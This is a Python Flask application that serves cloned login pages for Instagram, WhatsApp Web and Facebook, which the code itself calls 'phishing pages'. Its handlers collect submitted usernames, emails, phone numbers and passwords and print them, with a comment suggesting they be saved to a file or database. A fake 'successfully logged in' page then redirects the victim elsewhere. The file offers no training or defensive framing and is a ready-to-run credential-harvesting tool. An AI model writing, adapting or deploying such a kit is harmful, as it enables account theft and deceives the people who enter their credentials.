from flask import Flask, render_template_string, request

app = Flask(__name__)

# HTML templates for phishing pages
templates = {
    'instagram': '''
   <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 350px;
            margin: 100px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h1 {
            color: #3897f0;
            margin-bottom: 20px;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #007bbf;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
        <h1>Instagram</h1>
        <form action="/login/instagram" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>

    ''',
    'whatsapp': '''
   <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h1 {
            color: #25d366;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #25d366;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo" class="logo">
        <h1>WhatsApp Web</h1>
        <form action="/login/whatsapp" method="post">
            <input type="text" name="phone" placeholder="Phone number" required>
            <button type="submit">Send Code</button>
        </form>
    </div>
</body>
</html>

    ''',
    'facebook': '''
  <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h1 {
            color: #1877f2;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
        <h1>Facebook</h1>
        <form action="/login/facebook" method="post">
            <input type="text" name="email" placeholder="Email or Phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>

    '''
}

@app.route('/')
def index():
    return '''
   <!DOCTYPE html>
<html>
<head>
    <title>Phishing Pages</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        a {
            text-decoration: none;
            color: #333;
            font-size: 24px;
            margin: 10px;
        }
        a:hover {
            color: #007bff;
        }
    </style>
</head>
<body>
    <h1>Welcome Dear User!</h1>
    <p style ="font-family:monospace;">Please choose a social media platform:</p>
    <a href="/instagram"><i class="fab fa-instagram"></i> Instagram</a><br>
    <a href="/whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</a><br>
    <a href="/facebook"><i class="fab fa-facebook"></i> Facebook</a><br>
</body>
</html>

    '''

@app.route('/instagram')
def instagram():
    return render_template_string(templates['instagram'])

@app.route('/whatsapp')
def whatsapp():
    return render_template_string(templates['whatsapp'])

@app.route('/facebook')
def facebook():
    return render_template_string(templates['facebook'])

@app.route('/login/instagram', methods=['POST'])
def instagram_login():
    username = request.form['username']
    password = request.form['password']
    # Handle login (e.g., save to a file or database)
    print(f"Instagram Login: {username}, {password}")
    return '''
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            margin: 0;
        }
        .thank-you-message {
            text-align: center;
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #4CAF50;
        }
        p {
            color: #555;
        }
    </style>
</head>
<body>
    <div class="thank-you-message">
        <h1>Thank You!</h1>
        <p>You have successfully logged in.</p>
    </div>
    <script>
        // Optional: Redirect after a few seconds
        setTimeout(() => {
            window.location.href = 'https://frn13ds.github.io/404-Not-Found/'; // Change to your homepage URL
        }, 3000);
    </script>
</body>
</html>
'''

@app.route('/login/whatsapp', methods=['POST'])
def whatsapp_login():
    phone = request.form['phone']
    # Handle login (e.g., save to a file or database)
    print(f"WhatsApp Login: {phone}")
    return "Code sent!"

@app.route('/login/facebook', methods=['POST'])
def facebook_login():
    email = request.form['email']
    password = request.form['password']
    # Handle login (e.g., save to a file or database)
    print(f"Facebook Login: {email}, {password}")
    return '''
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            margin: 0;
        }
        .thank-you-message {
            text-align: center;
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #4CAF50;
        }
        p {
            color: #555;
        }
    </style>
</head>
<body>
    <div class="thank-you-message">
        <h1>Thank You!</h1>
        <p>You have successfully logged in.</p>
    </div>
    <script>
        // Optional: Redirect after a few seconds
        setTimeout(() => {
            window.location.href = 'https://frn13ds.github.io/404-Not-Found/'; // Change to your homepage URL
        }, 3000);
    </script>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(debug=True)